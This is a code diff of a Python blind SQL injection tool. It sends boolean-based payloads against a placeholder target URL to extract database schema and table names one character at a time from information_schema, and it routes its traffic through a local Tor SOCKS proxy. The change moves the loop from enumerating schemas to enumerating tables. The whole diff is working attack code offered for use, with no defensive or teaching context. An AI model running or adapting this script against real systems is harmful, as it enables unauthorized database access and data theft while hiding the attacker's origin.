@@ -2,7 +2,7 @@ import time
 import requests
 
 url = "--target--"
-schema = "--target--"
+
 
 #DO NOT CHANGE THIS PART
 prox = {'http': "socks5://127.0.0.1:9050"}
@@ -16,25 +16,25 @@ alphabet = [
 ]
 #DO NOT CHANGE THIS PART
 
-out = open("schematic.txt","w")
+out = open("out.txt","w")
 localtime = time.asctime( time.localtime(time.time()) )
 out.write(localtime+"\n")
 out.close()
-out = open("schematic.txt","a")
+out = open("out.txt","a")
 
+table = 499
+isTableFinished = False
 
-schemacount = 7
 correct = "p"
 
 
-isSchemaFinished = False
-for schema in range(0,schemacount):
+while True:
     char = 1
     temp = ""
-    out.write(str(schema)+" ")
-    while not isSchemaFinished:
+    out.write(str(table)+" ")
+    while not isTableFinished:
         for letter in alphabet:
-            injection = "a' OR IF('"+letter+"'=(SELECT SUBSTRING(schema_name,"+str(char)+",1) FROM information_schema.schemata LIMIT 1 OFFSET "+str(schema)+"),1,'a'); -- "
+            injection = "a' OR IF('"+letter+"'=(SELECT SUBSTRING(table_name,"+str(char)+",1) FROM information_schema.tables LIMIT 1 OFFSET "+str(table)+"),1,'a'); -- "
             response = requests.post(
                 url,
                 cookies=cookies,
@@ -47,7 +47,7 @@ for schema in range(0,schemacount):
                 proxies=prox
             )
 
-            #print(response.text)
+            print(response.text)
             time.sleep(0.3)
 
             if response.text[40]=='p':
@@ -57,11 +57,14 @@ for schema in range(0,schemacount):
                 char += 1
                 break
         else:
-            print("schema done")
+            print("table done")
             out.write("\n")
-            isSchemaFinished = True
-    isSchemaFinished = False
-    print("Schema "+str(schema)+": "+temp)
-    print("next schema")
+            isTableFinished = True
+    if temp=="":
+        break
+    table += 1
+    isTableFinished = False
+    print("Table "+str(table)+": "+temp)
+    print("next table")
 localtime = time.asctime( time.localtime(time.time()) )
 out.write(localtime)
